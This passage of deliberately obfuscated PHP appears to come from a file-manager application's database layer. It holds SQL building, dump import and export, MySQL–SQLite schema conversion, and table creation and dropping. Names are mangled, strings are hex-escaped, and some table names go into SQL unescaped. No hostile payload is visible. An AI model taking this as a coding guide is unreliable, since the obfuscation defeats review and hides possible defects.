md5(serialize($ÙŸ©Ñ¬í)); $Ô ú×¤€ = think_cache($Öşûó™ ); if ($Ô ú×¤€) { return $Ô ú×¤€; } } $¼óŠ”¢² = $this->parseSql($this->selectSql, $ÙŸ©Ñ¬í); $¼óŠ”¢² .= $this->parseLock(isset($ÙŸ©Ñ¬í[$­©æé©[897]]) ? $ÙŸ©Ñ¬í[$­©æé©[897]] : !1); if (isset($Öşûó™ )) { think_cache($Öşûó™ , $¼óŠ”¢²); } return $¼óŠ”¢²; } public function parseSql($¼ÏĞ¹´ğ, $·ˆÁøĞª = array()) { $Ç“ëô” =& $_SERVER[Ö†ØøÖ±]; $¼ÏĞ¹´ğ = str_replace(array($Ç“ëô”[1099], $Ç“ëô”[1100], $Ç“ëô”[1101], $Ç“ëô”[1102], $Ç“ëô”[1103], $Ç“ëô”[1104], $Ç“ëô”[1105], $Ç“ëô”[1106], $Ç“ëô”[1107], $Ç“ëô”[1108], $Ç“ëô”[1109]), array($this->parseTable("{$·ˆÁøĞª[$Ç“ëô”[332]]}"), $this->parseDistinct(isset($·ˆÁøĞª[$Ç“ëô”[1110]]) ? $·ˆÁøĞª[$Ç“ëô”[1110]] : !1), $this->parseField(!empty($·ˆÁøĞª[$Ç“ëô”[326]]) ? $·ˆÁøĞª[$Ç“ëô”[326]] : $Ç“ëô”[203]), $this->parseJoin(!empty($·ˆÁøĞª[$Ç“ëô”[335]]) ? $·ˆÁøĞª[$Ç“ëô”[335]] : $Ç“ëô”[12]), $this->parseWhere(!empty($·ˆÁøĞª[$Ç“ëô”[328]]) ? $·ˆÁøĞª[$Ç“ëô”[328]] : $Ç“ëô”[12]), $this->parseGroup(!empty($·ˆÁøĞª[$Ç“ëô”[556]]) ? $·ˆÁøĞª[$Ç“ëô”[556]] : $Ç“ëô”[12]), $this->parseHaving(!empty($·ˆÁøĞª[$Ç“ëô”[1111]]) ? $·ˆÁøĞª[$Ç“ëô”[1111]] : $Ç“ëô”[12]), $this->parseOrder(!empty($·ˆÁøĞª[$Ç“ëô”[418]]) ? $·ˆÁøĞª[$Ç“ëô”[418]] : $Ç“ëô”[12]), $this->parseLimit(!empty($·ˆÁøĞª[$Ç“ëô”[345]]) ? $·ˆÁøĞª[$Ç“ëô”[345]] : $Ç“ëô”[12]), $this->parseUnion(!empty($·ˆÁøĞª[$Ç“ëô”[400]]) ? $·ˆÁøĞª[$Ç“ëô”[400]] : $Ç“ëô”[12]), $this->parseComment(!empty($·ˆÁøĞª[$Ç“ëô”[407]]) ? $·ˆÁøĞª[$Ç“ëô”[407]] : $Ç“ëô”[12])), $¼ÏĞ¹´ğ); return $¼ÏĞ¹´ğ; } public function getLastSql($™¾–Ñ° = '') { return $™¾–Ñ° ? $this->modelSql[$™¾–Ñ°] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($µ¾äú¹Ÿ) { return addslashes($µ¾äú¹Ÿ); } public function setModel($ğœâĞƒ) { $this->model = $ğœâĞƒ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¢šÚœªô = array()) { $ö•…öƒ =& $_SERVER[Ö†ØøÖ±]; if (empty($¢šÚœªô)) { $¢šÚœªô = $GLOBALS[$ö•…öƒ[6]][$ö•…öƒ[21]]; } $this->database = $¢šÚœªô; } public function model($åÓ÷õÍû = '') { return new ModelBase($åÓ÷õÍû, $_SERVER[Ö†ØøÖ±][12], $this->database); } public function db($‚À­Îò· = false) { $ãÔ„£æ =& $_SERVER[Ö†ØøÖ±]; $Şë»ÂëÛ = array_change_key_case($this->database); if ($this->dbType() == $ãÔ„£æ[13] || !$‚À­Îò·) { return $this->model()->db(); } $Ç¬ŒŞ–š = $Şë»ÂëÛ[$ãÔ„£æ[1025]]; $Şë»ÂëÛ[$ãÔ„£æ[1025]] = $ãÔ„£æ[12]; if ($Şë»ÂëÛ[$ãÔ„£æ[1020]] == $ãÔ„£æ[1017]) { $¿“Õªà÷ = $Şë»ÂëÛ[$ãÔ„£æ[1026]]; $Şë»ÂëÛ[$ãÔ„£æ[1026]] = substr($¿“Õªà÷, 0, strrpos($¿“Õªà÷, $ãÔ„£æ[1112])); } $this->database = $Şë»ÂëÛ; $ãÓ¬…é‹ = $this->model()->db(); try { $ı¢¤»™Ä = $ãÓ¬…é‹->execute("\x73\x68\157\167\x20\144\x61\164\x61\142\141\x73\145\x73\x20\x6c\151\x6b\x65\40\x27{$Ç¬ŒŞ–š}\47"); } catch (Exception $¡²¦®‡) { } if (!$ı¢¤»™Ä) { $ãÓ¬…é‹->execute("\143\x72\x65\141\164\145\x20\x64\x61\164\x61\142\x61\x73\145\40\140{$Ç¬ŒŞ–š}\x60"); } $Şë»ÂëÛ[$ãÔ„£æ[1025]] = $Ç¬ŒŞ–š; if ($Şë»ÂëÛ[$ãÔ„£æ[1020]] == $ãÔ„£æ[1017]) { $Şë»ÂëÛ[$ãÔ„£æ[1026]] .= $ãÔ„£æ[1112] . $Ç¬ŒŞ–š; } $this->database = $Şë»ÂëÛ; $ãÓ¬…é‹->execute("\165\163\x65\x20\140{$Ç¬ŒŞ–š}\x60"); return $ãÓ¬…é‹; } public function createTable($ ¿ñÕ, &$’²º×¤ı) { $û¥šÑª =& $_SERVER[Ö†ØøÖ±]; if (!IO::exist($ ¿ñÕ)) { ActionCall($û¥šÑª[1113], !0, 0); show_json(LNG($û¥šÑª[1114]), !1); } $ş‚Ä¹Å = $this->model()->db(); $ú÷ÇòÃ‹ = sqlSplit(IO::getContent($ ¿ñÕ)); foreach ($ú÷ÇòÃ‹ as $Ã¯¶¤Ó) { $ÎƒóÕõ = stripos($Ã¯¶¤Ó, $û¥šÑª[1115]) === 0; if ($ÎƒóÕõ) { $’²º×¤ı->task[$û¥šÑª[839]] += 1; } $ş‚Ä¹Å->execute($Ã¯¶¤Ó); if ($ÎƒóÕõ) { preg_match($û¥šÑª[1116], $Ã¯¶¤Ó, $¦×åØ Ê); $’²º×¤ı->task[$û¥šÑª[1117]] = $¦×åØ Ê[1]; $’²º×¤ı->update(1); } } } public function insertTable($çÌÕÖç, &$ÄÙ¹Ø–) { $š˜ÃüÌê =& $_SERVER[Ö†ØøÖ±]; $‚Ş‘Ç²Ş = $this->model()->db(); $Ûäæ·È¹ = $³ñˆÁÆË ? array($³ñˆÁÆË) : $‚Ş‘Ç²Ş->getTables(); foreach ($çÌÕÖç as $Ñ¶ÃÛÖ®) { $³ñˆÁÆË = basename($Ñ¶ÃÛÖ®, $š˜ÃüÌê[841]); if (!in_array($³ñˆÁÆË, $Ûäæ·È¹)) { continue; } $ÄÙ¹Ø–->task[$š˜ÃüÌê[1117]] = $³ñˆÁÆË; if (get_filesize($Ñ¶ÃÛÖ®) == 0) { continue; } $´Šó˜ŒÙ = $this->sqlToDb($Ñ¶ÃÛÖ®, $ÄÙ¹Ø–); if (!$´Šó˜ŒÙ) { ActionCall($š˜ÃüÌê[1113], !0, 0); show_json(LNG($š˜ÃüÌê[1118]) . "\133{$³ñˆÁÆË}\135", !1); } } } public function sqlFromDb($ïÜˆœ¤Ù, $ÉÛÕéš‚, &$ì‚ñêà¼, $æ˜ËåÑ = '') { if ($ì‚ñêà¼) { $ì‚ñêà¼->task[$_SERVER[Ö†ØøÖ±][1117]] = $ïÜˆœ¤Ù; } $È¶ÕÙŒ° = $this->model($ïÜˆœ¤Ù); $†¶¡ÂÙÌ = 0; $±£ñ„¥¹ = 0; $•Ñ»ÁÔ = 10000; $³ÅË™§¶ = fopen($ÉÛÕéš‚, $_SERVER[Ö†ØøÖ±][1119]); $Í´ÍºÕ… = $È¶ÕÙŒ°->getPk(); $®³ö…é‚ = $È¶ÕÙŒ°->getDbFields(); $Ö²Ù´³ = $_SERVER[Ö†ØøÖ±][12]; if ($GLOBALS[$_SERVER[Ö†ØøÖ±][840]] && in_array($ïÜˆœ¤Ù, array($_SERVER[Ö†ØøÖ±][1120], $_SERVER[Ö†ØøÖ±][1121]))) { $Ö²Ù´³ = $ïÜˆœ¤Ù; } do { $ûÓ•ü£ª = array($Í´ÍºÕ… => array($_SERVER[Ö†ØøÖ±][1067], $±£ñ„¥¹)); $Õ†ÓÃÍ® = $È¶ÕÙŒ°->where($ûÓ•ü£ª)->field($®³ö…é‚)->order($Í´ÍºÕ… . $_SERVER[Ö†ØøÖ±][1122])->limit($•Ñ»ÁÔ)->select(); $Õ†ÓÃÍ® = !empty($Õ†ÓÃÍ®) ? $Õ†ÓÃÍ® : array(); if (!($í‚¼´Í÷ = count($Õ†ÓÃÍ®))) { break; } $ˆèá‚¯ = end($Õ†ÓÃÍ®); $±£ñ„¥¹ = $ˆèá‚¯[$Í´ÍºÕ…]; $¯ÙÅÆÑÕ = array(); foreach ($Õ†ÓÃÍ® as $‡ãéàæÈ) { if ($Ö²Ù´³) { if ($ïÜˆœ¤Ù == $_SERVER[Ö†ØøÖ±][1120]) { if ($‡ãéàæÈ[$_SERVER[Ö†ØøÖ±][33]] == $_SERVER[Ö†ØøÖ±][1123]) { $òË°Ó³ = json_decode($‡ãéàæÈ[$_SERVER[Ö†ØøÖ±][427]], !0); if ($òË°Ó³[$_SERVER[Ö†ØøÖ±][32]] == $GLOBALS[$_SERVER[Ö†ØøÖ±][840]] && $òË°Ó³[$_SERVER[Ö†ØøÖ±][803]] != 1) { continue; } } } else { if ($‡ãéàæÈ[$_SERVER[Ö†ØøÖ±][33]] == $_SERVER[Ö†ØøÖ±][1124] && $‡ãéàæÈ[$_SERVER[Ö†ØøÖ±][94]] == $_SERVER[Ö†ØøÖ±][832]) { continue; } } } if ($æ˜ËåÑ) { $‡ãéàæÈ[$_SERVER[Ö†ØøÖ±][84]] = "\x7b\x69\x6f\72{$æ˜ËåÑ}\175" . substr($‡ãéàæÈ[$_SERVER[Ö†ØøÖ±][84]], strlen("\173\x69\157\x3a{$‡ãéàæÈ[$_SERVER[Ö†ØøÖ±][870]]}\x7d")); $‡ãéàæÈ[$_SERVER[Ö†ØøÖ±][870]] = $æ˜ËåÑ; } $¯ÙÅÆÑÕ[] = $_SERVER[Ö†ØøÖ±][1125] . $this->sqlEncode($‡ãéàæÈ) . $_SERVER[Ö†ØøÖ±][1126]; } $½ñ€ß†± = "\111\x4e\x53\x45\122\x54\x20\x49\x4e\x54\117\40\x60{$ïÜˆœ¤Ù}\140\x20\50\140" . implode($_SERVER[Ö†ØøÖ±][1127], $®³ö…é‚) . $_SERVER[Ö†ØøÖ±][1128]; fwrite($³ÅË™§¶, $½ñ€ß†± . implode($_SERVER[Ö†ØøÖ±][1129], $¯ÙÅÆÑÕ) . $_SERVER[Ö†ØøÖ±][71] . PHP_EOL); $†¶¡ÂÙÌ += $í‚¼´Í÷; if ($ì‚ñêà¼) { $ì‚ñêà¼->update($í‚¼´Í÷); } } while ($•Ñ»ÁÔ == $í‚¼´Í÷); fclose($³ÅË™§¶); return $†¶¡ÂÙÌ; } public function sqlToDb($èáâà±…, &$õñ´™óĞ) { $½ÙÌ¼ÎÇ =& $_SERVER[Ö†ØøÖ±]; $Œ«ÆéÎ = $this->model()->db(); $ã‹æÚŠŒ = @fopen($èáâà±…, $½ÙÌ¼ÎÇ[1130]); if (!$ã‹æÚŠŒ) { return !1; } $¹­œ“Ù = 0; $•ŸÓÖÕÏ = $½ÙÌ¼ÎÇ[12]; $·ÇÃ«—‘ = array(); $à¤ƒË½ = $this->dbType(); $˜€¶Åá = $à¤ƒË½ == $½ÙÌ¼ÎÇ[13] ? 500 : 2000; $ôõ´…ĞÒ = basename($èáâà±…, $½ÙÌ¼ÎÇ[841]); $°òÑêùş = 0; $ÏôìÚî¤ = 4194304 - 104858; $±ÈÑ¿ñ¸ = 1000000 - 104858; while (!feof($ã‹æÚŠŒ)) { $ÊÂÃ–¶ç = trim(fgets($ã‹æÚŠŒ)); if (!$ÊÂÃ–¶ç) { continue; } $ÑÒä‚ù» = $this->sqlDecode($ÊÂÃ–¶ç, $à¤ƒË½, $ôõ´…ĞÒ); if (stripos($ÑÒä‚ù», $½ÙÌ¼ÎÇ[408]) === 0) { if (!$•ŸÓÖÕÏ) { $•ŸÓÖÕÏ = $ÑÒä‚ù» . $½ÙÌ¼ÎÇ[53]; } continue; } if ($õñ´™óĞ) { $õñ´™óĞ->task[$½ÙÌ¼ÎÇ[839]] += 1; } $¹­œ“Ù++; $·ÇÃ«—‘[] = rtrim(rtrim(trim($ÑÒä‚ù»), $½ÙÌ¼ÎÇ[50]), $½ÙÌ¼ÎÇ[71]); $ËÊùÜş’ = null; $”éÅÔîÍ = strlen($ÑÒä‚ù»); $°òÑêùş += $”éÅÔîÍ; if ($°òÑêùş >= ($˜€¶Åá == 500 ? $±ÈÑ¿ñ¸ : $ÏôìÚî¤)) { $ËÊùÜş’ = array_pop($·ÇÃ«—‘); if ($¹­œ“Ù > 1) { $¹­œ“Ù--; } } if ($¹­œ“Ù >= $˜€¶Åá || $ËÊùÜş’) { $ÑÒä‚ù» = $•ŸÓÖÕÏ . implode($½ÙÌ¼ÎÇ[50], $·ÇÃ«—‘); if (!$Œ«ÆéÎ->execute($ÑÒä‚ù»)) { return !1; } if ($õñ´™óĞ) { $õñ´™óĞ->update($¹­œ“Ù); } $·ÇÃ«—‘ = array(); $¹­œ“Ù = 0; $°òÑêùş = 0; if ($ËÊùÜş’) { $·ÇÃ«—‘ = array($ËÊùÜş’); $¹­œ“Ù = 1; $°òÑêùş = $”éÅÔîÍ; } } } fclose($ã‹æÚŠŒ); if (!empty($·ÇÃ«—‘)) { $ÑÒä‚ù» = $•ŸÓÖÕÏ . implode($½ÙÌ¼ÎÇ[50], $·ÇÃ«—‘); if (!$Œ«ÆéÎ->execute($ÑÒä‚ù»)) { return !1; } if ($õñ´™óĞ) { $õñ´™óĞ->update($¹­œ“Ù); } } return !0; } public function dropTable($»µÏÍ¡è = null) { $úÏï¬õà = $this->model()->db(); $şÕåı‡û = $»µÏÍ¡è ? array($»µÏÍ¡è) : $úÏï¬õà->getTables(); if (!$şÕåı‡û) { return; } foreach ($şÕåı‡û as $»µÏÍ¡è) { if ($»µÏÍ¡è) { $»µÏÍ¡è = strtolower($»µÏÍ¡è); } else { continue; } $úÏï¬õà->execute("\144\162\x6f\x70\x20\164\141\x62\x6c\145\40\x69\x66\40\x65\x78\151\x73\x74\x73\x20\x60{$»µÏÍ¡è}\140"); } } private function sqlEncode($˜×»Ö ›) { $óÊ±æ·Ï =& $_SERVER[Ö†ØøÖ±]; $íÍŸö„Æ = array(); foreach ($˜×»Ö › as $Ê‘ŞÛ¶) { if (is_array($Ê‘ŞÛ¶)) { $Ê‘ŞÛ¶ = json_encode_force($Ê‘ŞÛ¶); } $Ê‘ŞÛ¶ = addslashes($Ê‘ŞÛ¶); $Ê‘ŞÛ¶ = str_replace(array($óÊ±æ·Ï[1131], $óÊ±æ·Ï[246]), array($óÊ±æ·Ï[1132], $óÊ±æ·Ï[1133]), $Ê‘ŞÛ¶); $íÍŸö„Æ[] = str_replace($óÊ±æ·Ï[58], $óÊ±æ·Ï[1134], $Ê‘ŞÛ¶); } return $óÊ±æ·Ï[58] . implode($óÊ±æ·Ï[1135], $íÍŸö„Æ) . $óÊ±æ·Ï[58]; } private function sqlDecode($÷Ü“÷ƒò, $ÅãÕƒæÜ, $‚´õ­Üå = '') { $¸Æ­°Ÿ€ =& $_SERVER[Ö†ØøÖ±]; $÷Ü“÷ƒò = str_replace(array($¸Æ­°Ÿ€[1132], $¸Æ­°Ÿ€[1133]), array($¸Æ­°Ÿ€[1131], $¸Æ­°Ÿ€[246]), $÷Ü“÷ƒò); if ($ÅãÕƒæÜ == $¸Æ­°Ÿ€[13]) { return $‚´õ­Üå != $¸Æ­°Ÿ€[1136] ? stripslashes($÷Ü“÷ƒò) : $÷Ü“÷ƒò; } if ($‚´õ­Üå == $¸Æ­°Ÿ€[1136]) { $÷Ü“÷ƒò = str_replace($¸Æ­°Ÿ€[1137], $¸Æ­°Ÿ€[118], stripslashes($÷Ü“÷ƒò)); } return $÷Ü“÷ƒò; } public function getSqlFile($ó û¯ = '') { $•‚ú£á =& $_SERVER[Ö†ØøÖ±]; $Šìî›¯ = $this->dbType(!0); $ƒÖÈ“¹š = CONTROLLER_DIR . "\151\x6e\x73\x74\141\x6c\x6c\57\x64\x61\164\x61\x2f{$Šìî›¯}\56\163\x71\x6c"; $´’ÓÅ«‹ = file_get_contents($ƒÖÈ“¹š); $¾™Ã´úÂ = $•‚ú£á[1138] . ($Šìî›¯ == $•‚ú£á[857] ? $•‚ú£á[1139] : $•‚ú£á[1140]) . $•‚ú£á[1141]; preg_match_all($¾™Ã´úÂ, $´’ÓÅ«‹, $”ŒÈ›Î); $“êìê¡Ÿ = $”ŒÈ›Î[1]; $±Àœ€ = $this->model()->db(); $²Ùà¸ö = $±Àœ€->getTables(); $ı­ŒÒÓ = TEMP_FILES . $•‚ú£á[1142] . date($•‚ú£á[255]) . $•‚ú£á[8]; del_dir($ı­ŒÒÓ); mk_dir($ı­ŒÒÓ); $·ó«±õê = $ı­ŒÒÓ . $•‚ú£á[1143]; $Œ Óƒ© = $ı­ŒÒÓ . $•‚ú£á[1144]; $é†„¨õ = $Šìî›¯ == $•‚ú£á[13] ? $•‚ú£á[857] : $•‚ú£á[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\141\x6c\x6c\x2f\144\x61\164\141\x2f{$é†„¨õ}\x2e\163\x71\x6c", $ı­ŒÒÓ); @touch($ı­ŒÒÓ . $Šìî›¯ . $•‚ú£á[841]); $¬Ùˆ¥¸¥ = fopen($·ó«±õê, $•‚ú£á[1119]); $ı¾€ÆÓë = fopen($Œ Óƒ©, $•‚ú£á[1119]); if ($Šìî›¯ == $•‚ú£á[13]) { $²Ùà¸ö = array_diff($²Ùà¸ö, array($•‚ú£á[837], $•‚ú£á[838])); $Ä¤¯Š¦å = array($•‚ú£á[1145], $•‚ú£á[1146], $•‚ú£á[1147]); fwrite($ı¾€ÆÓë, implode(PHP_EOL, $Ä¤¯Š¦å) . PHP_EOL . PHP_EOL); foreach ($²Ùà¸ö as $ë¹äğğ¶) { $ãÜ»ˆİÙ = $this->sqlFromSqlite($ë¹äğğ¶); if (!$ãÜ»ˆİÙ[$•‚ú£á[13]]) { continue; } fwrite($ı¾€ÆÓë, $ãÜ»ˆİÙ[$•‚ú£á[13]] . PHP_EOL . PHP_EOL); if (!in_array($ë¹äğğ¶, $“êìê¡Ÿ)) { fwrite($¬Ùˆ¥¸¥, $ãÜ»ˆİÙ[$•‚ú£á[857]] . PHP_EOL . PHP_EOL); } } } else { foreach ($²Ùà¸ö as $ë¹äğğ¶) { $ãÜ»ˆİÙ = $this->sqlFromMysql($ë¹äğğ¶); if (!$ãÜ»ˆİÙ[$•‚ú£á[857]]) { continue; } fwrite($¬Ùˆ¥¸¥, $ãÜ»ˆİÙ[$•‚ú£á[857]] . PHP_EOL . PHP_EOL); if (!in_array($ë¹äğğ¶, $“êìê¡Ÿ)) { fwrite($ı¾€ÆÓë, $ãÜ»ˆİÙ[$•‚ú£á[13]] . PHP_EOL . PHP_EOL); } } } fclose($¬Ùˆ¥¸¥); fclose($ı¾€ÆÓë); $´’ÓÅ«‹ = array($•‚ú£á[857] => $·ó«±õê, $•‚ú£á[13] => $Œ Óƒ©); return $ó û¯ ? $´’ÓÅ«‹[$ó û¯] : $´’ÓÅ«‹; } public function dbType($¹¨¬Ş” = false) { $ü¸—É =& $_SERVER[Ö†ØøÖ±]; $ÒêÕƒë = $¹¨¬Ş” ? $GLOBALS[$ü¸—É[6]][$ü¸—É[21]] : $this->database; $ÒêÕƒë = array_change_key_case($ÒêÕƒë); $çìüÎØ = $ÒêÕƒë[$ü¸—É[1020]]; if ($çìüÎØ == $ü¸—É[1017]) { $”ˆğğÏñ = explode($ü¸—É[4], $ÒêÕƒë[$ü¸—É[1026]]); $çìüÎØ = $”ˆğğÏñ[0]; } $´§Úñóã = array($ü¸—É[1148] => $ü¸—É[13], $ü¸—É[965] => $ü¸—É[857]); if (isset($´§Úñóã[$çìüÎØ])) { $çìüÎØ = $´§Úñóã[$çìüÎØ]; } return $çìüÎØ; } public function sqlFromMysql($¥Ö¹Öµô, $¸”¯Ç¤¶ = '') { $¦»Òßû =& $_SERVER[Ö†ØøÖ±]; $ûı…‡®ò = $this->model()->db(); $ãà¾ÕÕ– = $ûı…‡®ò->query($¦»Òßû[1149] . $¥Ö¹Öµô . $¦»Òßû[437]); if (!$ãà¾ÕÕ– || !$ãà¾ÕÕ–[0]) { return !1; } $üáÈãª = _get($ãà¾ÕÕ–[0], $¦»Òßû[1150], $¦»Òßû[12]); if (!$üáÈãª) { return !1; } $Æû¬’î = "\104\x52\x4f\120\x20\124\x41\x42\114\105\x20\111\106\40\105\x58\x49\x53\x54\123\x20\140{$¥Ö¹Öµô}\140\73" . PHP_EOL . $üáÈãª . $¦»Òßû[71]; if ($¸”¯Ç¤¶ && $¸”¯Ç¤¶ == $¦»Òßû[857]) { return $Æû¬’î; } $·å “”Ó = array_change_key_case($GLOBALS[$¦»Òßû[6]][$¦»Òßû[21]]); $‚¡Û½ğ = $·å “”Ó[$¦»Òßû[1025]]; $ğ½İËä = $¦»Òßû[1151] . $‚¡Û½ğ . $¦»Òßû[1152] . $¥Ö¹Öµô . $¦»Òßû[58]; $‘Ïë’º÷ = $¦»Òßû[1153] . $¥Ö¹Öµô . $¦»Òßû[953]; $Ø‡†ï– = $ûı…‡®ò->query($ğ½İËä); if (empty($Ø‡†ï–)) { $§©÷éÁˆ = array($¦»Òßû[857] => $¦»Òßû[12], $¦»Òßû[13] => $¦»Òßû[12]); return $¸”¯Ç¤¶ ? $§©÷éÁˆ[$¸”¯Ç¤¶] : $§©÷éÁˆ; } $Ú°á¼·‘ = $ûı…‡®ò->query($‘Ïë’º÷); $ôìğÔ‹­ = $¦»Òßû[12]; $ó”âğ‰Ü = array(); foreach ($Ú°á¼·‘ as $…†ş°Æ) { if (!$ôìğÔ‹­ && $…†ş°Æ[$¦»Òßû[1154]] == $¦»Òßû[1155]) { $ôìğÔ‹­ = $…†ş°Æ[$¦»Òßû[1156]]; } if (isset($ó”âğ‰Ü[$…†ş°Æ[$¦»Òßû[1154]]])) { $ó”âğ‰Ü[$…†ş°Æ[$¦»Òßû[1154]]][$¦»Òßû[1157]][] = $…†ş°Æ[$¦»Òßû[1156]]; continue; } $ó”âğ‰Ü[$…†ş°Æ[$¦»Òßû[1154]]] = array($¦»Òßû[1158] => $…†ş°Æ[$¦»Òßû[1154]], $¦»Òßû[1157] => array($…†ş°Æ[$¦»Òßû[1156]]), $¦»Òßû[1159] => $…†ş°Æ[$¦»Òßû[1160]] == $¦»Òßû[88] ? 0 : 1); } $À¡Ñ¢Ø = array(); foreach ($ó”âğ‰Ü as $…†ş°Æ) { $É‘Çô·ˆ = $…†ş°Æ[$¦»Òßû[1158]] == $¦»Òßû[1155]; $š‘®Ô  = array($¦»Òßû[1161], $…†ş°Æ[$¦»Òßû[1159]] == $¦»Òßû[88] && !$É‘Çô·ˆ ? $¦»Òßû[1162] : $¦»Òßû[12], $¦»Òßû[1163], $¦»Òßû[1164] . $¥Ö¹Öµô . $¦»Òßû[11] . ($É‘Çô·ˆ ? $¦»Òßû[1165] : $…†ş°Æ[$¦»Òßû[1158]]) . $¦»Òßû[118], $¦»Òßû[1166], $¦»Òßû[118] . $¥Ö¹Öµô . $¦»Òßû[118], $¦»Òßû[1167] . implode($¦»Òßû[1168], $…†ş°Æ[$¦»Òßû[1157]]) . $¦»Òßû[1169]); $À¡Ñ¢Ø[] = implode($¦»Òßû[53], $š‘®Ô ) . $¦»Òßû[71]; } $Ğ‰‹ƒİä = array(); $ÂÑ‘•Èù = array($¦»Òßû[1170] => $¦»Òßû[1171], $¦»Òßû[1171] => $¦»Òßû[1171], $¦»Òßû[341] => $¦»Òßû[368], $¦»Òßû[340] => $¦»Òßû[368]); foreach ($Ø‡†ï– as $…†ş°Æ) { $š‘®Ô  = array($¦»Òßû[118] . $…†ş°Æ[$¦»Òßû[1172]] . $¦»Òßû[118], isset($ÂÑ‘•Èù[$…†ş°Æ[$¦»Òßû[1173]]]) ? $ÂÑ‘•Èù[$…†ş°Æ[$¦»Òßû[1173]]] : $…†ş°Æ[$¦»Òßû[1174]], $…†ş°Æ[$¦»Òßû[1175]] == $¦»Òßû[951] ? $¦»Òßû[1176] : $¦»Òßû[1177], $…†ş°Æ[$¦»Òßû[1172]] == $ôìğÔ‹­ ? $¦»Òßû[1178] : $¦»Òßû[12], $…†ş°Æ[$¦»Òßû[1002]] ? strtoupper(str_replace($¦»Òßû[11], $¦»Òßû[12], $…†ş°Æ[$¦»Òßû[1002]])) : $¦»Òßû[12]); $Ğ‰‹ƒİä[] = trim(implode($¦»Òßû[53], $š‘®Ô )); } $¼–ÈŠî = array($¦»Òßû[1179] . $¥Ö¹Öµô . $¦»Òßû[1180], $¦»Òßû[1181] . $¥Ö¹Öµô . $¦»Òßû[1182], implode($¦»Òßû[50] . PHP_EOL, $Ğ‰‹ƒİä), $¦»Òßû[999]); $·¬®üä = implode(PHP_EOL, array_merge($¼–ÈŠî, $À¡Ñ¢Ø)); if ($¸”¯Ç¤¶ && $¸”¯Ç¤¶ == $¦»Òßû[13]) { return $·¬®üä; } $§©÷éÁˆ = array($¦»Òßû[857] => $Æû¬’î, $¦»Òßû[13] => $·¬®üä); return $¸”¯Ç¤¶ ? $§©÷éÁˆ[$¸”¯Ç¤¶] : $§©÷éÁˆ; } public function sqlFromSqlite($‡¡˜÷â€, $¸¢şÕÉÑ = '') { $ÂÃš¸ŠÀ =& $_SERVER[Ö†ØøÖ±]; $Íæ¾Ê©Ô = $this->model()->db(); $øó¹¶Ô„ = "\x50\x52\x41\107\115\x41\x20\124\x41\x42\x4c\x45\x5f\111\116\106\117\x20\x28\x27{$‡¡˜÷â€}\x27\x29"; $ñ¡÷•·ë = "\123\x45\114\x45\103\124\40\x2a\x20\106\122\x4f\x4d\x20\163\161\x6c\x69\x74\x65\x5f\x6d\141\163\x74\x65\162\40\x57\110\x45\122\105\x20\x74\142\x6c\x5f\x6e\141\x6d\x65\40\75\40\47{$‡¡˜÷â€}\x27"; $Ë©µãú° = $Íæ¾Ê©Ô->query($øó¹¶Ô„); if (empty($Ë©µãú°)) { $˜ÓŒ¿ûÁ = array($ÂÃš¸ŠÀ[857] => $ÂÃš¸ŠÀ[12], $ÂÃš¸ŠÀ[13] => $ÂÃš¸ŠÀ[12]); return $¸¢şÕÉÑ ? $˜ÓŒ¿ûÁ[$¸¢şÕÉÑ] : $˜ÓŒ¿ûÁ; } $“ÅºúÔ = $Íæ¾Ê©Ô->query($ñ¡÷•·ë); $’â­ËÊ = $ğ·İà¦• = array(); foreach ($“ÅºúÔ as $Û«Ìí…Å) { if ($Û«Ìí…Å[$ÂÃš¸ŠÀ[33]] == $ÂÃš¸ŠÀ[332]) { $’â­ËÊ[] = $Û«Ìí…Å[$ÂÃš¸ŠÀ[1183]]; } else { $ğ·İà¦•[$Û«Ìí…Å[$ÂÃš¸ŠÀ[32]]] = $Û«Ìí…Å[$ÂÃš¸ŠÀ[1183]]; } } $–ËûóàØ = array_merge(array($ÂÃš¸ŠÀ[1179] . $‡¡˜÷â€ . $ÂÃš¸ŠÀ[118]), $’â­ËÊ, array_values($ğ·İà¦•)); $–ËûóàØ = implode($ÂÃš¸ŠÀ[71] . PHP_EOL, $–ËûóàØ) . $ÂÃš¸ŠÀ[71]; if ($¸¢şÕÉÑ && $¸¢şÕÉÑ == $ÂÃš¸ŠÀ[13]) { return $–ËûóàØ; } $‘·½©˜Ù = array(); $¤—ÉÕ = array($ÂÃš¸ŠÀ[1171] => $ÂÃš¸ŠÀ[1184], $ÂÃš¸ŠÀ[368] => $ÂÃš¸ŠÀ[1185]); $²·øÔ˜Ï = $ÂÃš¸ŠÀ[12]; foreach ($Ë©µãú° as $Û«Ìí…Å) { if ($Û«Ìí…Å[$ÂÃš¸ŠÀ[57]] == $ÂÃš¸ŠÀ[88]) { $²·øÔ˜Ï = $Û«Ìí…Å[$ÂÃš¸ŠÀ[32]]; } $ˆ¸ïËùÓ = array($ÂÃš¸ŠÀ[437] . $Û«Ìí…Å[$ÂÃš¸ŠÀ[32]] . $ÂÃš¸ŠÀ[437], isset($¤—ÉÕ[$Û«Ìí…Å[$ÂÃš¸ŠÀ[33]]]) ? $¤—ÉÕ[$Û«Ìí…Å[$ÂÃš¸ŠÀ[33]]] : $Û«Ìí…Å[$ÂÃš¸ŠÀ[33]], $Û«Ìí…Å[$ÂÃš¸ŠÀ[35]] == $ÂÃš¸ŠÀ[88] ? $ÂÃš¸ŠÀ[1176] : $ÂÃš¸ŠÀ[1186] . $Û«Ìí…Å[$ÂÃš¸ŠÀ[56]], $Û«Ìí…Å[$ÂÃš¸ŠÀ[57]] == $ÂÃš¸ŠÀ[88] ? $ÂÃš¸ŠÀ[1187] : $ÂÃš¸ŠÀ[12]); $‘·½©˜Ù[] = trim(implode($ÂÃš¸ŠÀ[53], $ˆ¸ïËùÓ)); } foreach ($ğ·İà¦• as $Êêù‡ã¹ => $À©ÂÎ§×) { $Ïš“˜¼ = str_replace($ÂÃš¸ŠÀ[1188] . $‡¡˜÷â€ . $ÂÃš¸ŠÀ[11], $ÂÃš¸ŠÀ[12], $Êêù‡ã¹); $Ûª²Û¿« = str_replace(array($ÂÃš¸ŠÀ[118], $ÂÃš¸ŠÀ[1010]), $ÂÃš¸ŠÀ[437], substr($À©ÂÎ§×, stripos($À©ÂÎ§×, $ÂÃš¸ŠÀ[313]))); if ($Ïš“˜¼ == $ÂÃš¸ŠÀ[1165]) { 